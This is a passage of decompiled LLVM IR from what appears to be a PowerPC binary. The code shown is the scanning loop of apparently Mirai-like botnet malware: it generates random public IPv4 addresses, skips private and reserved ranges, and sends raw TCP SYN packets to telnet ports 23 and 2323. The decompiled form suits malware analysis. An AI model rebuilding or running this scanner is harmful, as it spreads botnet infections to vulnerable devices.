  %v4_10008e68 = call i32 @function_10008658(i32 %v0_10008e5c, i32 ptrtoint (i32* @global_var_1000e05c.244 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1000e068.245 to i32), i32* %r4.global-to-local, align 4
  %v0_10008e78 = load i32, i32* @r27, align 4
  store i32 %v0_10008e78, i32* %r3.global-to-local, align 4
  store i32 268471936, i32* @lr, align 4
  %v4_10008e7c = call i32 @function_10008658(i32 %v0_10008e78, i32 ptrtoint (i32* @global_var_1000e068.245 to i32), i32 1)
  %v0_10008e80 = load i32, i32* @r27, align 4
  store i32 %v0_10008e80, i32* %r3.global-to-local, align 4
  %v0_10008e84 = load i32, i32* %r18.global-to-local, align 4
  store i32 %v0_10008e84, i32* %r4.global-to-local, align 4
  store i32 268471952, i32* @lr, align 4
  %v4_10008e8c = call i32 @function_10008658(i32 %v0_10008e80, i32 %v0_10008e84, i32 1)
  %v0_10008e90 = load i32, i32* @r27, align 4
  store i32 %v0_10008e90, i32* %r3.global-to-local, align 4
  %v0_10008e94 = load i32, i32* @r22, align 4
  store i32 %v0_10008e94, i32* %r4.global-to-local, align 4
  store i32 268471968, i32* @lr, align 4
  %sext8 = mul i32 %v0_10008e94, 16777216
  %v3_10008e9c = sdiv i32 %sext8, 16777216
  %v5_10008e9c = call i32 @function_10008658(i32 %v0_10008e90, i32 %v3_10008e9c, i32 1)
  %v0_10008ea0 = load i32, i32* @r27, align 4
  store i32 %v0_10008ea0, i32* %r3.global-to-local, align 4
  %v0_10008ea4 = load i32, i32* @r24, align 4
  store i32 %v0_10008ea4, i32* %r4.global-to-local, align 4
  store i32 268471984, i32* @lr, align 4
  %v4_10008eac = call i32 @function_10008658(i32 %v0_10008ea0, i32 %v0_10008ea4, i32 1)
  %v0_10008eb0 = load i32, i32* @r27, align 4
  store i32 %v0_10008eb0, i32* %r3.global-to-local, align 4
  %v0_10008eb4 = load i32, i32* @r25, align 4
  store i32 %v0_10008eb4, i32* %r4.global-to-local, align 4
  store i32 268472000, i32* @lr, align 4
  %v4_10008ebc = call i32 @function_10008658(i32 %v0_10008eb0, i32 %v0_10008eb4, i32 1)
  %v0_10008ec0 = load i32, i32* @r27, align 4
  store i32 %v0_10008ec0, i32* %r3.global-to-local, align 4
  %v0_10008ec4 = load i32, i32* @r29, align 4
  store i32 %v0_10008ec4, i32* %r4.global-to-local, align 4
  store i32 268472016, i32* @lr, align 4
  %v4_10008ecc = call i32 @function_10008658(i32 %v0_10008ec0, i32 %v0_10008ec4, i32 1)
  store i32 ptrtoint (i32* @global_var_1000e070.246 to i32), i32* %r4.global-to-local, align 4
  %v0_10008edc = load i32, i32* @r27, align 4
  store i32 %v0_10008edc, i32* %r3.global-to-local, align 4
  store i32 268472036, i32* @lr, align 4
  %v4_10008ee0 = call i32 @function_10008658(i32 %v0_10008edc, i32 ptrtoint (i32* @global_var_1000e070.246 to i32), i32 1)
  %v0_10008ee4 = load i32, i32* @r27, align 4
  store i32 %v0_10008ee4, i32* %r3.global-to-local, align 4
  %v0_10008ee8 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10008ee8, i32* %r4.global-to-local, align 4
  store i32 268472052, i32* @lr, align 4
  %v5_10008ef0 = call i32 @function_10008658(i32 %v0_10008ee4, i32 %v0_10008ee8, i32 1)
  %v0_10008ef4 = load i32, i32* @r27, align 4
  store i32 %v0_10008ef4, i32* %r3.global-to-local, align 4
  %v0_10008ef8 = load i32, i32* %r17.global-to-local, align 4
  store i32 %v0_10008ef8, i32* %r4.global-to-local, align 4
  store i32 268472068, i32* @lr, align 4
  %v5_10008f00 = call i32 @function_10008658(i32 %v0_10008ef4, i32 %v0_10008ef8, i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_1000e0dc.247 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000e0dc.247 to i32), i32* %r4.global-to-local, align 4
  store i32 268472088, i32* @lr, align 4
  %v4_10008f14 = call i32 @function_10008658(i32 ptrtoint ([5 x i8]* @global_var_1000e0dc.247 to i32), i32 1, i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_1000e078.248 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000e080.249 to i32), i32* %r4.global-to-local, align 4
  store i32 268472112, i32* @lr, align 4
  %v5_10008f2c = call i32 @function_10008658(i32 ptrtoint ([7 x i8]* @global_var_1000e078.248 to i32), i32 ptrtoint ([7 x i8]* @global_var_1000e080.249 to i32), i32 1)
  store i32 %v5_10008f2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008f30

dec_label_pc_10008f30:                            ; preds = %dec_label_pc_10009410, %dec_label_pc_100089dc
  %v3_10008f30 = load i32, i32* @global_var_1001eb38.185, align 4
  store i32 %v3_10008f30, i32* @r29, align 4
  %v0_10008f34 = load i32, i32* %r21.global-to-local, align 4
  %v2_10008f34 = icmp slt i32 %v0_10008f34, %v3_10008f30
  %v4_10008f34 = icmp eq i32 %v0_10008f34, %v3_10008f30
  store i1 %v2_10008f34, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10008f34, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10008f34, label %dec_label_pc_1000912c, label %dec_label_pc_10008f3c

dec_label_pc_10008f3c:                            ; preds = %dec_label_pc_10008f30
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10008f40 = ptrtoint i32* %stack_var_-1872 to i32
  store i32 %v2_10008f40, i32* @r26, align 4
  store i64 0, i64* %stack_var_-1900, align 8
  store i32 0, i32* @r28, align 4
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10008f50

dec_label_pc_10008f50:                            ; preds = %dec_label_pc_10009058.dec_label_pc_10008f50_crit_edge, %dec_label_pc_10008f3c
  %v0_10008f50 = phi i32 [ %v0_10008f50.pre, %dec_label_pc_10009058.dec_label_pc_10008f50_crit_edge ], [ 0, %dec_label_pc_10008f3c ]
  store i32 %v0_10008f50, i32* %stack_var_-1872, align 4
  %v0_10008f60 = call i32 @function_10007ca8()
  %v1_10008f60 = trunc i32 %v0_10008f60 to i16
  store i32 %v0_10008f60, i32* %r3.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i16 %v1_10008f60, i16* bitcast (i32* @global_var_1001ebd0.200 to i16*), align 4
  %v3_10008f6c = load i32, i32* @global_var_1001eb10.71, align 4
  store i32 %v3_10008f6c, i32* %r0.global-to-local, align 4
  store i32 %v3_10008f6c, i32* @global_var_1001ebd8.250, align 4
  br label %dec_label_pc_10008f74.preheader

dec_label_pc_10008f74.preheader:                  ; preds = %dec_label_pc_10008f50, %dec_label_pc_100095d4
  br label %dec_label_pc_10008f74

dec_label_pc_10008f74:                            ; preds = %dec_label_pc_1000961c, %dec_label_pc_10009608, %dec_label_pc_100095fc, %dec_label_pc_100095e8, %dec_label_pc_10009050, %dec_label_pc_10009048, %dec_label_pc_10009040, %dec_label_pc_10009038, %dec_label_pc_10009030, %dec_label_pc_10009028, %dec_label_pc_10009020, %dec_label_pc_10009018, %dec_label_pc_10009010, %dec_label_pc_10009008, %dec_label_pc_10009000, %dec_label_pc_10008ff0, %dec_label_pc_10008fe8, %dec_label_pc_10008fb8, %dec_label_pc_10008fb0, %dec_label_pc_10008fa0, %dec_label_pc_10008f98, %dec_label_pc_10008f90, %dec_label_pc_10008f74, %dec_label_pc_10008f74.preheader
  %v0_10008f74 = call i32 @function_10007ca8()
  store i32 %v0_10008f74, i32* %r3.global-to-local, align 4
  %v1_10008f78 = urem i32 %v0_10008f74, 256
  store i32 %v1_10008f78, i32* %r11.global-to-local, align 4
  %v1_10008f7c = udiv i32 %v0_10008f74, 16777216
  store i32 %v1_10008f7c, i32* %r10.global-to-local, align 4
  %v1_10008f80 = icmp ult i32 %v1_10008f78, 127
  %v3_10008f80 = icmp eq i32 %v1_10008f78, 127
  store i1 %v1_10008f80, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008f80, i1* %cr7_eq.global-to-local, align 1
  %v1_10008f84 = call i32 @__asm_rlwinm(i32 %v0_10008f74, i32 24, i32 24, i32 31)
  store i32 %v1_10008f84, i32* @r9, align 4
  %v1_10008f88 = call i32 @__asm_rlwinm(i32 %v0_10008f74, i32 16, i32 24, i32 31)
  store i32 %v1_10008f88, i32* %r3.global-to-local, align 4
  %v0_10008f8c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10008f8c, label %dec_label_pc_10008f74, label %dec_label_pc_10008f90

dec_label_pc_10008f90:                            ; preds = %dec_label_pc_10008f74
  %v0_10008f90 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008f90 = icmp slt i32 %v0_10008f90, 0
  %v3_10008f90 = icmp eq i32 %v0_10008f90, 0
  store i1 %v1_10008f90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008f90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008f90, label %dec_label_pc_10008f74, label %dec_label_pc_10008f98

dec_label_pc_10008f98:                            ; preds = %dec_label_pc_10008f90
  %v1_10008f98 = icmp slt i32 %v0_10008f90, 3
  %v3_10008f98 = icmp eq i32 %v0_10008f90, 3
  store i1 %v1_10008f98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008f98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008f98, label %dec_label_pc_10008f74, label %dec_label_pc_10008fa0

dec_label_pc_10008fa0:                            ; preds = %dec_label_pc_10008f98
  %v1_10008fa0 = add i32 %v0_10008f90, 241
  %v1_10008fa4 = urem i32 %v1_10008fa0, 256
  store i32 %v1_10008fa4, i32* %r0.global-to-local, align 4
  %v1_10008fa8 = icmp eq i32 %v1_10008fa4, 0
  %v3_10008fa8 = icmp eq i32 %v1_10008fa4, 1
  store i1 %v1_10008fa8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fa8, i1* %cr7_eq.global-to-local, align 1
  %tmp107 = or i32 %v1_10008fa4, 1
  %tmp108 = icmp eq i32 %tmp107, 1
  br i1 %tmp108, label %dec_label_pc_10008f74, label %dec_label_pc_10008fb0

dec_label_pc_10008fb0:                            ; preds = %dec_label_pc_10008fa0
  %v1_10008fb0 = icmp slt i32 %v0_10008f90, 56
  %v3_10008fb0 = icmp eq i32 %v0_10008f90, 56
  store i1 %v1_10008fb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008fb0, label %dec_label_pc_10008f74, label %dec_label_pc_10008fb8

dec_label_pc_10008fb8:                            ; preds = %dec_label_pc_10008fb0
  %v1_10008fb8 = icmp slt i32 %v0_10008f90, 10
  %v3_10008fb8 = icmp eq i32 %v0_10008f90, 10
  store i1 %v1_10008fb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008fb8, label %dec_label_pc_10008f74, label %dec_label_pc_10008fc0

dec_label_pc_10008fc0:                            ; preds = %dec_label_pc_10008fb8
  %v1_10008fc0 = icmp slt i32 %v0_10008f90, 192
  %v3_10008fc0 = icmp eq i32 %v0_10008f90, 192
  store i1 %v1_10008fc0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fc0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008fc0, label %dec_label_pc_100095d4, label %dec_label_pc_10008fc8

dec_label_pc_10008fc8:                            ; preds = %dec_label_pc_10008fc0
  %v1_10008fc8 = icmp slt i32 %v0_10008f90, 172
  %v3_10008fc8 = icmp eq i32 %v0_10008f90, 172
  store i1 %v1_10008fc8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fc8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008fc8, label %dec_label_pc_100095e0, label %dec_label_pc_10008fd0

dec_label_pc_10008fd0:                            ; preds = %dec_label_pc_10008fc8
  %v1_10008fd0 = icmp slt i32 %v0_10008f90, 100
  %v3_10008fd0 = icmp eq i32 %v0_10008f90, 100
  store i1 %v1_10008fd0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fd0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008fd0, label %dec_label_pc_100095f4, label %dec_label_pc_10008fd8

dec_label_pc_10008fd8:                            ; preds = %dec_label_pc_10008fd0
  %v1_10008fd8 = icmp slt i32 %v0_10008f90, 169
  %v3_10008fd8 = icmp eq i32 %v0_10008f90, 169
  store i1 %v1_10008fd8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fd8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008fd8, label %dec_label_pc_10009608, label %dec_label_pc_10008fe0

dec_label_pc_10008fe0:                            ; preds = %dec_label_pc_10008fd8
  %v1_10008fe0 = icmp slt i32 %v0_10008f90, 198
  %v3_10008fe0 = icmp eq i32 %v0_10008f90, 198
  store i1 %v1_10008fe0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fe0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008fe0, label %dec_label_pc_10009614, label %dec_label_pc_10008fe8

dec_label_pc_10008fe8:                            ; preds = %dec_label_pc_10008fe0
  %v1_10008fe8 = icmp ult i32 %v0_10008f90, 223
  %v2_10008fe8 = icmp ugt i32 %v0_10008f90, 223
  %v3_10008fe8 = icmp eq i32 %v0_10008f90, 223
  store i1 %v1_10008fe8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008fe8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10008fe8, label %dec_label_pc_10008f74, label %dec_label_pc_10008ff0

dec_label_pc_10008ff0:                            ; preds = %dec_label_pc_10008fe8
  %v1_10008ff0 = add i32 %v0_10008f90, 250
  %v1_10008ff4 = urem i32 %v1_10008ff0, 256
  store i32 %v1_10008ff4, i32* %r0.global-to-local, align 4
  %v1_10008ff8 = icmp eq i32 %v1_10008ff4, 0
  %v3_10008ff8 = icmp eq i32 %v1_10008ff4, 1
  store i1 %v1_10008ff8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008ff8, i1* %cr7_eq.global-to-local, align 1
  %tmp109 = or i32 %v1_10008ff4, 1
  %tmp110 = icmp eq i32 %tmp109, 1
  br i1 %tmp110, label %dec_label_pc_10008f74, label %dec_label_pc_10009000

dec_label_pc_10009000:                            ; preds = %dec_label_pc_10008ff0
  %v1_10009000 = icmp slt i32 %v0_10008f90, 11
  %v3_10009000 = icmp eq i32 %v0_10008f90, 11
  store i1 %v1_10009000, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009000, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009000, label %dec_label_pc_10008f74, label %dec_label_pc_10009008

dec_label_pc_10009008:                            ; preds = %dec_label_pc_10009000
  %v1_10009008 = icmp slt i32 %v0_10008f90, 21
  %v3_10009008 = icmp eq i32 %v0_10008f90, 21
  store i1 %v1_10009008, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009008, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009008, label %dec_label_pc_10008f74, label %dec_label_pc_10009010

dec_label_pc_10009010:                            ; preds = %dec_label_pc_10009008
  %v1_10009010 = icmp slt i32 %v0_10008f90, 22
  %v3_10009010 = icmp eq i32 %v0_10008f90, 22
  store i1 %v1_10009010, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009010, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009010, label %dec_label_pc_10008f74, label %dec_label_pc_10009018

dec_label_pc_10009018:                            ; preds = %dec_label_pc_10009010
  %v1_10009018 = icmp slt i32 %v0_10008f90, 26
  %v3_10009018 = icmp eq i32 %v0_10008f90, 26
  store i1 %v1_10009018, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009018, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009018, label %dec_label_pc_10008f74, label %dec_label_pc_10009020

dec_label_pc_10009020:                            ; preds = %dec_label_pc_10009018
  %v1_10009020 = icmp slt i32 %v0_10008f90, 28
  %v3_10009020 = icmp eq i32 %v0_10008f90, 28
  store i1 %v1_10009020, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009020, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009020, label %dec_label_pc_10008f74, label %dec_label_pc_10009028

dec_label_pc_10009028:                            ; preds = %dec_label_pc_10009020
  %v1_10009028 = icmp slt i32 %v0_10008f90, 29
  %v3_10009028 = icmp eq i32 %v0_10008f90, 29
  store i1 %v1_10009028, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009028, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009028, label %dec_label_pc_10008f74, label %dec_label_pc_10009030

dec_label_pc_10009030:                            ; preds = %dec_label_pc_10009028
  %v1_10009030 = icmp slt i32 %v0_10008f90, 30
  %v3_10009030 = icmp eq i32 %v0_10008f90, 30
  store i1 %v1_10009030, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009030, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009030, label %dec_label_pc_10008f74, label %dec_label_pc_10009038

dec_label_pc_10009038:                            ; preds = %dec_label_pc_10009030
  %v1_10009038 = icmp slt i32 %v0_10008f90, 33
  %v3_10009038 = icmp eq i32 %v0_10008f90, 33
  store i1 %v1_10009038, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009038, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009038, label %dec_label_pc_10008f74, label %dec_label_pc_10009040

dec_label_pc_10009040:                            ; preds = %dec_label_pc_10009038
  %v1_10009040 = icmp slt i32 %v0_10008f90, 55
  %v3_10009040 = icmp eq i32 %v0_10008f90, 55
  store i1 %v1_10009040, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009040, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009040, label %dec_label_pc_10008f74, label %dec_label_pc_10009048

dec_label_pc_10009048:                            ; preds = %dec_label_pc_10009040
  %v1_10009048 = icmp slt i32 %v0_10008f90, 214
  %v3_10009048 = icmp eq i32 %v0_10008f90, 214
  store i1 %v1_10009048, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009048, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009048, label %dec_label_pc_10008f74, label %dec_label_pc_10009050

dec_label_pc_10009050:                            ; preds = %dec_label_pc_10009048
  %v1_10009050 = icmp slt i32 %v0_10008f90, 215
  %v3_10009050 = icmp eq i32 %v0_10008f90, 215
  store i1 %v1_10009050, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10009050, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009050, label %dec_label_pc_10008f74, label %dec_label_pc_10009050.dec_label_pc_10009058.loopexit_crit_edge

dec_label_pc_10009050.dec_label_pc_10009058.loopexit_crit_edge: ; preds = %dec_label_pc_10009050
  %v0_1000905c.pre.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10009058

dec_label_pc_10009058:                            ; preds = %dec_label_pc_1000961c, %dec_label_pc_10009608, %dec_label_pc_100095fc, %dec_label_pc_100095e8, %dec_label_pc_10009614, %dec_label_pc_100095f4, %dec_label_pc_100095e0, %dec_label_pc_10009050.dec_label_pc_10009058.loopexit_crit_edge, %dec_label_pc_100095d4.dec_label_pc_10009058_crit_edge
  %v0_10009064 = phi i32 [ %v0_1000906422, %dec_label_pc_100095d4.dec_label_pc_10009058_crit_edge ], [ %v1_10008f88, %dec_label_pc_10009050.dec_label_pc_10009058.loopexit_crit_edge ], [ %v1_10008f88, %dec_label_pc_100095e0 ], [ %v1_10008f88, %dec_label_pc_100095f4 ], [ %v1_10008f88, %dec_label_pc_10009614 ], [ %v1_10008f88, %dec_label_pc_100095e8 ], [ %v1_10008f88, %dec_label_pc_100095fc ], [ %v1_10008f88, %dec_label_pc_10009608 ], [ %v1_10008f88, %dec_label_pc_1000961c ]
  %v0_1000905c = phi i32 [ %v0_100095d4, %dec_label_pc_100095d4.dec_label_pc_10009058_crit_edge ], [ %v0_1000905c.pre.pre, %dec_label_pc_10009050.dec_label_pc_10009058.loopexit_crit_edge ], [ %v0_100095e0, %dec_label_pc_100095e0 ], [ %v0_100095f4, %dec_label_pc_100095f4 ], [ %v0_10009614, %dec_label_pc_10009614 ], [ %v0_100095e0, %dec_label_pc_100095e8 ], [ %v0_100095f4, %dec_label_pc_100095fc ], [ %v0_10009608, %dec_label_pc_10009608 ], [ %v0_10009614, %dec_label_pc_1000961c ]
  %v0_10009058 = phi i32 [ %v0_10009058.pre, %dec_label_pc_100095d4.dec_label_pc_10009058_crit_edge ], [ %v0_10008f90, %dec_label_pc_10009050.dec_label_pc_10009058.loopexit_crit_edge ], [ 172, %dec_label_pc_100095e0 ], [ 100, %dec_label_pc_100095f4 ], [ 198, %dec_label_pc_10009614 ], [ 172, %dec_label_pc_100095e8 ], [ 100, %dec_label_pc_100095fc ], [ 169, %dec_label_pc_10009608 ], [ 198, %dec_label_pc_1000961c ]
  %v1_10009058 = mul i32 %v0_10009058, 16777216
  %v1_1000905c = mul i32 %v0_1000905c, 65536
  %v2_10009060 = or i32 %v1_10009058, %v1_1000905c
  %v1_10009064 = mul i32 %v0_10009064, 256
  %v1_10009068 = load i32, i32* %r10.global-to-local, align 4
  %v2_10009068 = or i32 %v2_10009060, %v1_10009068
  store i32 %v2_10009068, i32* %r0.global-to-local, align 4
  %v0_1000906c = load i32, i32* @r30, align 4
  store i32 %v0_1000906c, i32* @r3, align 4
  %v2_10009070 = or i32 %v2_10009068, %v1_10009064
  store i32 %v2_10009070, i32* %r9.global-to-local, align 4
  store i32 20, i32* %r4.global-to-local, align 4
  store i32 %v2_10009070, i32* @global_var_1001ebdc.252, align 4
  %v0_1000907c = load i32, i32* @r27, align 4
  %v1_1000907c = trunc i32 %v0_1000907c to i16
  store i16 %v1_1000907c, i16* bitcast (i32* @global_var_1001ebd6.253 to i16*), align 4
  %v2_10009080 = call i32 @function_100060d4(i32 %v0_1000906c, i32 20)
  %v3_10009080 = trunc i32 %v2_10009080 to i16
  %v3_10009084 = load i64, i64* %stack_var_-1900, align 8
  %v4_10009084 = trunc i64 %v3_10009084 to i32
  store i32 %v4_10009084, i32* %r9.global-to-local, align 4
  store i16 %v3_10009080, i16* bitcast (i32* @global_var_1001ebd6.253 to i16*), align 4
  %v4_10009094 = mul nsw i64 %v3_10009084, 1717986919
  %v5_10009094 = udiv i64 %v4_10009094, 4294967296
  %v6_10009094 = trunc i64 %v5_10009094 to i32
  %tmp = icmp slt i32 %v4_10009084, 0
  %v1_10009098 = zext i1 %tmp to i32
  %v2_10009098 = ashr i32 %v4_10009084, 31
  %v3_10009098 = and i32 %v2_10009098, -2
  %v4_10009098 = or i32 %v3_10009098, %v1_10009098
  store i32 %v4_10009098, i32* %r11.global-to-local, align 4
  %v1_1000909c51 = udiv i64 %v4_10009094, 17179869184
  %v1_1000909c = trunc i64 %v1_1000909c51 to i32
  %v2_1000909c = ashr i32 %v6_10009094, 31
  %v3_1000909c = and i32 %v2_1000909c, -1073741824
  %v4_1000909c = or i32 %v3_1000909c, %v1_1000909c
  %v2_100090a0 = sub nsw i32 %v4_1000909c, %v4_10009098
  %v1_100090a4 = mul i32 %v2_100090a0, 10
  %v2_100090a8 = icmp slt i32 %v4_10009084, %v1_100090a4
  %v4_100090a8 = icmp eq i32 %v4_10009084, %v1_100090a4
  store i1 %v2_100090a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100090a8, i1* %cr7_eq.global-to-local, align 1
  %.5 = select i1 %v4_100090a8, i16 2323, i16 23
  store i16 %.5, i16* @global_var_1001ebe2.202, align 2
  %v3_100090b8 = load i32, i32* @global_var_1001ebdc.252, align 4
  store i32 %v3_100090b8, i32* %r0.global-to-local, align 4
  %v0_100090bc = load i32, i32* @r31, align 4
  store i32 %v0_100090bc, i32* @r4, align 4
  %v0_100090c0 = load i32, i32* @r27, align 4
  %v1_100090c0 = trunc i32 %v0_100090c0 to i16
  store i16 %v1_100090c0, i16* bitcast (i32* @global_var_1001ebf0.254 to i16*), align 4
  store i32 %v3_100090b8, i32* @global_var_1001ebe4.255, align 4
  store i32 20, i32* %r6.global-to-local, align 4
  %v0_100090d0 = load i32, i32* @r30, align 4
  store i32 %v0_100090d0, i32* %r3.global-to-local, align 4
  %v4_100090d4 = call i32 @function_10006138(i32 %v0_100090d0, i32 %v0_100090bc, i32 20, i32 20)
  %v5_100090d4 = trunc i32 %v4_100090d4 to i16
  store i32 268566528, i32* %r10.global-to-local, align 4
  store i16 %v5_100090d4, i16* bitcast (i32* @global_var_1001ebf0.254 to i16*), align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_100090e4 = load i32, i32* @global_var_1001ebdc.252, align 4
  store i32 %v3_100090e4, i32* %r9.global-to-local, align 4
  %v0_100090e8 = load i32, i32* @r30, align 4
  store i32 %v0_100090e8, i32* %r4.global-to-local, align 4
  %v3_100090ec = load i16, i16* @global_var_1001ebe2.202, align 2
  %v4_100090ec = zext i16 %v3_100090ec to i32
  store i32 %v4_100090ec, i32* %r11.global-to-local, align 4
  %v3_100090f4 = load i32, i32* @global_var_1001eb40.192, align 4
  store i32 %v3_100090f4, i32* %r3.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_100090fc = load i32, i32* @r26, align 4
  store i32 %v0_100090fc, i32* %r7.global-to-local, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 2, i32* %stack_var_-1872, align 4
  store i32 268472596, i32* @lr, align 4
  %v6_10009110 = call i32 @function_1000c140(i32 %v3_100090f4, i32 %v0_100090e8, i32 40, i32 16384, i32 %v0_100090fc, i32 16)
  store i32 %v6_10009110, i32* %r3.global-to-local, align 4
  %v3_10009114 = load i64, i64* %stack_var_-1900, align 8
  %v4_10009114 = trunc i64 %v3_10009114 to i32
  %v1_10009118 = add i32 %v4_10009114, 1
  store i32 %v1_10009118, i32* %r9.global-to-local, align 4
  %v1_1000911c = icmp slt i32 %v1_10009118, 383
  %v3_1000911c = icmp eq i32 %v1_10009118, 383
  store i1 %v1_1000911c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000911c, i1* %cr7_eq.global-to-local, align 1
  %v5_10009120 = sext i32 %v1_10009118 to i64
  store i64 %v5_10009120, i64* %stack_var_-1900, align 8
  %tmp111 = icmp slt i32 %v1_10009118, 384
  br i1 %tmp111, label %dec_label_pc_10009058.dec_label_pc_10008f50_crit_edge, label %dec_label_pc_10009128

dec_label_pc_10009058.dec_label_pc_10008f50_crit_edge: ; preds = %dec_label_pc_10009058
  %v0_10008f50.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10008f50

dec_label_pc_10009128:                            ; preds = %dec_label_pc_10009058
  %v0_10009128 = load i32, i32* @r29, align 4
  store i32 %v0_10009128, i32* %r21.global-to-local, align 4
  br label %dec_label_pc_1000912c

dec_label_pc_1000912c:                            ; preds = %dec_label_pc_10008f30, %dec_label_pc_10009128
  %v0_1000912c = call i32 @function_1000bb0c()
  store i32 %v0_1000912c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 %v0_1000912c, i32* %r22.global-to-local, align 4
  %v2_10009144 = ptrtoint i32* %stack_var_-1600 to i32
  %v4_10009190 = zext i8 %tmp63 to i32
  %v1_10009194 = icmp ult i8 %tmp63, 6
  %v3_10009194 = icmp eq i8 %tmp63, 6
  %v4_100091b4 = zext i16 %tmp62 to i32
  %v1_100091c4 = and i32 %tmp61, 131072
  %v3_100091c4 = icmp eq i32 %v1_100091c4, 0
  %v1_100091ec = add i32 %tmp60, -1
  %v2_100091f0 = icmp slt i32 %v1_100091ec, %tmp59
  %v4_100091f0 = icmp eq i32 %v1_100091ec, %tmp59
  %v1_100091cc = and i32 %tmp61, 1048576
  %v3_100091cc = icmp eq i32 %v1_100091cc, 0
  %v1_100091d4 = and i32 %tmp61, 262144
  %v3_100091d4 = icmp eq i32 %v1_100091d4, 0
  %v1_100091dc = and i32 %tmp61, 65536
  %v3_100091dc = icmp eq i32 %v1_100091dc, 0
  br label %dec_label_pc_10009138

dec_label_pc_10009138:                            ; preds = %dec_label_pc_100091e4, %dec_label_pc_100091dc, %dec_label_pc_100091d4, %dec_label_pc_100091b4, %dec_label_pc_100091ac, %dec_label_pc_10009190, %dec_label_pc_1000917c, %dec_label_pc_100091cc, %dec_label_pc_100091c0, %dec_label_pc_10009174, %dec_label_pc_1000912c
  %v1_10009140 = phi i32 [ %v0_1000912c, %dec_label_pc_1000912c ], [ %v0_10009168, %dec_label_pc_10009174 ], [ %v0_10009168, %dec_label_pc_100091c0 ], [ %v0_10009168, %dec_label_pc_100091cc ], [ %v0_10009168, %dec_label_pc_1000917c ], [ %v0_10009168, %dec_label_pc_10009190 ], [ %v0_10009168, %dec_label_pc_100091ac ], [ %v0_10009168, %dec_label_pc_100091b4 ], [ %v0_10009168, %dec_label_pc_100091d4 ], [ %v0_10009168, %dec_label_pc_100091dc ], [ %v0_10009168, %dec_label_pc_100091e4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_10009140 = inttoptr i32 %v1_10009140 to i32*
  store i32 0, i32* %v2_10009140, align 4
  store i32 %v2_10009144, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r6.global-to-local, align 4
  %v3_10009150 = load i32, i32* @global_var_1001eb40.192, align 4
  store i32 %v3_10009150, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 268472672, i32* @lr, align 4
